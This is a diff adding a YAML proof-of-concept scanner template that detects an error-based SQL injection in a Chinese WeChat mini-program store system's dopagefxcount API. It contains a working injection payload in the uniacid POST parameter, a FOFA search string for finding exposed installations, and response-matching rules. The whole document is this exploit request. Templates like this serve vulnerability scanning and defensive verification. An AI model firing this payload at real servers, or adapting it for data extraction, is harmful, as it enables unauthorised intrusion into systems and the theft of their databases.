@@ -1,0 +1,20 @@
+id: poc-yaml-internet-wxapps-dopagefxcount-sqli
+info:
+  name: 万能门店小程序系统 dopagefxcount SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 全行业小程序运营系统
+  fofa: body="/comhome/cases/index.html"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/wxapps/dopagefxcount
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5('{{.t1}}')))),3119)-- 123&suid=1
+  expression: status_code == 200 && contains(body,"SQLSTATE[HY000]") && contains(body,"Malformed
+    GTID set specification") && !contains(body,"<") && contains(body,t2)
+transport: http
